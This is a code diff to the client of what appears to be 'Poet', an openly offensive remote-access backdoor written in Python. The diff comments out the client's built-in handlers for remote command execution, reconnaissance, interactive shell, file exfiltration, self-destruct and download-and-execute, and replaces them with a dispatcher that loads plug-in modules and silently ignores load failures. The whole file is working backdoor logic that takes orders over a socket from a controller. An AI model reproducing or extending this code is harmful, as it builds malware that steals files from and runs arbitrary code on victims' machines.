@@ -16,6 +16,7 @@ import tempfile
 import subprocess as sp
 
 import debug
+import module
 import config as CFG
 from poetsocket import *
 
@@ -50,6 +51,11 @@ class PoetClient(object):
     def __init__(self, host, port):
         self.host = host
         self.port = port
+        try:
+            self.mods = module.load_modules()[1]
+        except:
+            # silently fail
+            pass
 
     def start(self):
         """Core Poet client functionality."""
@@ -57,40 +63,50 @@ class PoetClient(object):
         s = PoetSocketClient(self.host, self.port)
         while True:
             try:
+                found = False
                 inp = s.recv()
+
                 if inp == 'fin':
+                    found = True
                     break
-                elif inp == 'getprompt':
-                    s.send(self.get_prompt())
-                elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                    s.send(self.execute(inp))
-                elif inp == 'recon':
-                    s.send(zlib.compress(self.recon()))
-                elif inp.startswith('shell '):
-                    self.shell(inp, s)
-                    s.send('shelldone')
-                elif inp.startswith('exfil '):
-                    try:
-                        with open(os.path.expanduser(inp[6:])) as f:
-                            s.send(zlib.compress(f.read()))
-                    except IOError as e:
-                        s.send(e.strerror)
-                elif inp == 'selfdestruct':
-                    try:
-                        selfdestruct()
-                        s.send('boom')
-                        sys.exit()
-                    except Exception as e:
-                        s.send(str(e.message))
-                elif inp.startswith('dlexec '):
-                    try:
-                        self.dlexec(inp)
-                        s.send('done')
-                    except Exception as e:
-                        s.send(str(e.message))
-                elif inp.startswith('chint'):
-                    self.chint(s, inp)
-                else:
+                # elif inp == 'getprompt':
+                #     s.send(self.get_prompt())
+                # elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
+                #     s.send(self.execute(inp))
+                # elif inp == 'recon':
+                #     s.send(zlib.compress(self.recon()))
+                # elif inp.startswith('shell '):
+                #     self.shell(inp, s)
+                #     s.send('shelldone')
+                # elif inp.startswith('exfil '):
+                #     try:
+                #         with open(os.path.expanduser(inp[6:])) as f:
+                #             s.send(zlib.compress(f.read()))
+                #     except IOError as e:
+                #         s.send(e.strerror)
+                # elif inp == 'selfdestruct':
+                #     try:
+                #         selfdestruct()
+                #         s.send('boom')
+                #         sys.exit()
+                #     except Exception as e:
+                #         s.send(str(e.message))
+                # elif inp.startswith('dlexec '):
+                #     try:
+                #         self.dlexec(inp)
+                #         s.send('done')
+                #     except Exception as e:
+                #         s.send(str(e.message))
+                # elif inp.startswith('chint'):
+                #     self.chint(s, inp)
+
+                for mod in self.mods:
+                    for cmd, func in mod.client.iteritems():
+                        if inp == cmd:
+                            found = True
+                            s.send(func())
+
+                if not found:
                     s.send('Unrecognized')
             except socket.error as e:
                 if e.message == 'too much data!':
